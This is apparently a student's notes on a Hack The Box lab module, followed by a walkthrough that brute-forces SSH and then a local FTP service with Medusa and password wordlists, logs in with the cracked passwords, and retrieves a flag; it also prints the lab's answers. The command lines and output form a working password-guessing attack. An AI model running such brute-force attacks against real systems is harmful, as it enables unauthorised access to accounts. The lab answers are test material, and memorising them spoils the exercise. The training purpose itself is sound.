In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application ofÂ `Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.

`SSH`Â is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols likeÂ `Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.

`FTP`Â is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.

## Kick-off

**To follow along, start the target system via the question section at the bottom of the page.**

We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the usernameÂ `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.

The following command serves as our starting point:

```shell-session
smoothment@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Let's break down each component:

- `-h <IP>`: Specifies the target system's IP address.
- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
- `-u sshuser`: Sets the username for the brute-force attack.
- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.

```shell-session
smoothment@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Upon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.

## Gaining Access

With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:

```shell-session
smoothment@htb[/htb]$ ssh sshuser@<IP> -p PORT
```

This command will initiate an interactive SSH session, granting you access to the remote system's command line.

### Expanding the Attack Surface

Once inside the system, the next step is identifying other potential attack surfaces. UsingÂ `netstat`Â (within the SSH session) to list open ports and listening services, you discover a service running on port 21.

Â 
```shell-session
smoothment@htb[/htb]$ netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```

Further reconnaissance withÂ `nmap`Â (within the SSH session) confirms this finding as an ftp server.


```shell-session
smoothment@htb[/htb]$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

### Targeting the FTP Server

Having identified the FTP server, you can proceed to brute-force its authentication mechanism.

If we explore theÂ `/home`Â directory on the target system, we see anÂ `ftpuser`Â folder, which implies the likelihood of the FTP server username beingÂ `ftpuser`. Based on this, we can modify our Medusa command accordingly:


```shell-session
smoothment@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```

The key differences here are:

- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
- `-u ftpuser`: Specifies the usernameÂ `ftpuser`.
- `-M ftp`: Selects the FTP module within Medusa.
- `-t 5`: Increases the number of parallel login attempts to 5.

### Retrieving The Flag

Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use theÂ `get`Â command to download theÂ `flag.txt`Â file, which may contain sensitive information.:


```shell-session
smoothment@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||25926|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||37251|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (131.45 KiB/s)
ftp> exit
221 Goodbye.
```

Then read the file to get the flag:

```shell-session
smoothment@htb[/htb]$ cat flag.txt
HTB{...}
```

# Questions
---

![Pasted image 20250213152556.png](../../../../IMAGES/Pasted%20image%2020250213152556.png)

Let's begin by launching the default medusa scan:

```
medusa -h 94.237.54.164 -n 59668 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```


After a while, we get the following:

```
 Password: 987654321 (43 of 200 complete)
ACCOUNT CHECK: [ssh] Host: 94.237.54.164 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: demo (44 of 200 complete)
ACCOUNT CHECK: [ssh] Host: 94.237.54.164 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 12341234 (45 of 200 complete)
ACCOUNT CHECK: [ssh] Host: 94.237.54.164 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r5t (46 of 200 complete)
ACCOUNT FOUND: [ssh] Host: 94.237.54.164 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```


We got credentials for ssh:

```
`sshuser`:`1q2w3e4r5t`
```

Let's log into ssh:

```
ssh sshuser@94.237.54.164 -p 59668
sshuser@94.237.54.164's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Feb 13 20:32:53 2025 from 10.30.18.26
sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$
```


Nice, we're in, let's look around, it's useful to check open ports and listening services, for this, we can use the following command:

```
netstat -tulpn | grep LISTEN
```

We get this:

```
sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

We can think that the service running on port 21 is FTP, Nmap is enabled on the machine, let's run a scan to identify the services:

```
sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$ nmap localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-13 20:35 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
```

It was ftp indeed, machine also has medusa installed, this can help us brute force the login for ftp, if we check the home directory, we find this:


```
sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$ ls /home
ftpuser  sshuser
```

We got other user `ftpuser`, let's brute force:

```
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

sword: 1234567 (11 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: qwerty (12 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: Million2 (13 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: abc123 (14 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: 000000 (15 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: qqww1122 (16 of 197 complete)
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 1 complete) Password: 1234 (17 of 197 complete)
```

We got credentials:

```ad-note
`ftpuser`:`qqww1122`
```

Let's log into ftp:

```
ftp ftp://ftpuser:qqww1122@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||26248|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Feb 13 20:24 flag.txt
226 Directory send OK.
```

Found the flag, let's read it:

```
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||34427|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************|    35      697.54 KiB/s    00:00 ETA
226 Transfer complete.

cat flag.txt

HTB{SSH_and_FTP_Bruteforce_Success}

```

Nice, answers are: 

```ad-important
1. `qqww1122`
2. `HTB{SSH_and_FTP_Bruteforce_Success}`
```


